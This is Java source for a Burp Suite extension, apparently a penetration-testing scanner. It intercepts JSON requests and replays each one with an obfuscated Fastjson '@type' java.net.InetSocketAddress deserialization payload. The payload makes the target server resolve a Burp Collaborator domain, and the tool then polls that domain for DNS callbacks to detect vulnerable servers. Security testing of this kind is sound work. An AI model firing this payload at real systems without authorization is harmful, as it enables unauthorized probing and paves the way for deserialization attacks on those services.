package jrcet.frame.Scanner.Fastjson;

import burp.MyRegisterHttpHandler;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.internal.ObjectFactoryLocator;
import jrcet.help.Helper;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;

import static burp.MyExtender.*;
import static jrcet.frame.Scanner.Fastjson.FastjsonComponent.FastjsonComponentPanel;

public class Fastjson {
    public static String DNSLOG = "";
    public static String TOKEN = "";

    private static final HashMap<String, Integer> ColumnMap =  new HashMap<>() {
        {
            put("#", 0);
            put("Tool", 1);
            put("Method", 2);
            put("Host", 3);
            put("Path", 4);
            put("Length", 5);
            put("requestTime", 6);
            put("responseTime", 7);
            put("DnsLog", 8);
            put("FastJson", 9);
        }
    };

    public static final String FASTJSON = "FASTJSON";
    public static String FastjsonCheckSerialNumber = "1";
    public static ArrayList<String> FastjsonCheckUrlList = new ArrayList<>();
    public static HashMap<String, FastjsonTableEntry> FastjsonEntryMap = new HashMap<>();

    public static boolean FastjsonDebug = true;

    public static boolean check(HttpRequestToBeSent requestToBeSent){

        List<HttpHeader> httpHeaders = requestToBeSent.headers();
        for(HttpHeader httpHeader: httpHeaders){
//            API.logging().output().println(httpHeader.name()+":"+httpHeader.value());
            if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && httpHeader.value().toLowerCase().contains("application/json")){
                return true;
            }
        }
        return false;
    }

    public static JCheckBox getFastjsonMenuWorkBox(){
        return (JCheckBox) Helper.getComponent(FastjsonComponentPanel, "FastjsonMenuWorkBox");
    }

    public static JTable getFastjsonLoggerTable(){
        return (JTable) Helper.getComponent(FastjsonComponentPanel, "FastjsonLoggerTable");
    }

    public static void setFastjsonLoggerTableValueAt(String value,Integer rowIndex, String ColumnName){
        getFastjsonLoggerTable().getModel().setValueAt(value, rowIndex, ColumnMap.get(ColumnName));
    }

    public static String getFastjsonRequestNumber(int row){
        return (String) getFastjsonLoggerTable().getValueAt(row,0);
    }


    public static String fastjsonCheckRequest(HttpRequestToBeSent requestToBeSent){


        if(!Fastjson.check(requestToBeSent)) return "";

        String requestNumber = FastjsonCheckSerialNumber;
        String requestHost   = requestToBeSent.httpService().host();
        String requestMethod = requestToBeSent.method();
        String requestTool   = requestToBeSent.toolSource().toolType().toolName();
        String requestPath   = requestToBeSent.path();
        String requestTime   = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
        String[] inf         = new String[]{
                requestNumber,
                requestTool,
                requestMethod,
                requestHost,
                requestPath,
                "",
                requestTime,
                "",
                "",
                ""
        };

        FastjsonTableEntry rowEntry = new FastjsonTableEntry(inf);
        FastjsonEntryMap.put(requestNumber,rowEntry);
        rowEntry.setRawRequest(requestToBeSent);

        ((DefaultTableModel)getFastjsonLoggerTable().getModel()).addRow(inf);

        FastjsonCheckSerialNumber = Integer.toString(Integer.parseInt(FastjsonCheckSerialNumber)+1);

        return FASTJSON+requestNumber;
    }

    public static void fastjsonCheckResponse(HttpResponseReceived responseReceived, String fastjsonSerialNumber){

        Integer rowIndex = Integer.parseInt(fastjsonSerialNumber) - 1;


        String randomString   = Helper.createRandomString(8);
        String responseLength = Integer.toString(responseReceived.body().length());
        String responseTime   = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());


        HttpResponse simplifyHighAuthhttpResponse = responseReceived.withBody(responseReceived.body().subArray(0, Math.min(20000, Integer.parseInt(responseLength))));


        CollaboratorClient  collaboratorClient  = API.collaborator().createClient();
        CollaboratorPayload collaboratorPayload = collaboratorClient.generatePayload(randomString);


        setFastjsonLoggerTableValueAt(responseLength, rowIndex, "Length");
        setFastjsonLoggerTableValueAt(responseTime, rowIndex, "responseTime");
        setFastjsonLoggerTableValueAt(collaboratorPayload.toString(),rowIndex,"DnsLog");

        FastjsonEntryMap.get(fastjsonSerialNumber).setLength(responseLength);
        FastjsonEntryMap.get(fastjsonSerialNumber).setResponseTime(responseTime);
        FastjsonEntryMap.get(fastjsonSerialNumber).setRawResponse(responseReceived);
        FastjsonEntryMap.get(fastjsonSerialNumber).setSimplifyRawResponse(simplifyHighAuthhttpResponse);
        FastjsonEntryMap.get(fastjsonSerialNumber).setDNSClient(collaboratorClient);
        FastjsonEntryMap.get(fastjsonSerialNumber).setDNSPayload(collaboratorPayload);

        FastjsonCheckUrlList.add(FastjsonEntryMap.get(fastjsonSerialNumber).getRawRequest().url());

        String fastjsonRequestBody  =  ("\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+collaboratorPayload+"\"}}}");
        HttpRequest fastjsonRequest = FastjsonEntryMap.get(fastjsonSerialNumber).getRawRequest().withBody(ByteArray.byteArray(fastjsonRequestBody.getBytes(StandardCharsets.UTF_8)));

        new MyRegisterHttpHandler.checkWorker("fastjson", fastjsonSerialNumber, fastjsonRequest).execute();

        new dnslogWorker(fastjsonSerialNumber).execute();
    }
    public static class dnslogWorker extends SwingWorker<Void, Void>{

        public String requestNumber;

        public dnslogWorker(String requestNumber){
            this.requestNumber = requestNumber;
        }
        @Override
        protected Void doInBackground() throws Exception {
            CollaboratorClient collaboratorClient   = FastjsonEntryMap.get(requestNumber).getDNSClient();
            CollaboratorPayload collaboratorPayload = FastjsonEntryMap.get(requestNumber).getDNSPayload();
            List<Interaction> interactionList;

            for(int i=0; i<20; i++){

                interactionList = collaboratorClient.getInteractions(ObjectFactoryLocator.FACTORY.interactionIdFilter(collaboratorPayload.id().toString()));
                if(interactionList.size()!=0){
                    setFastjsonLoggerTableValueAt("True", Integer.parseInt(requestNumber) - 1, "FastJson");
                    break;
                }
                Thread.sleep(1000);
            }
            return null;
        }
    }

}
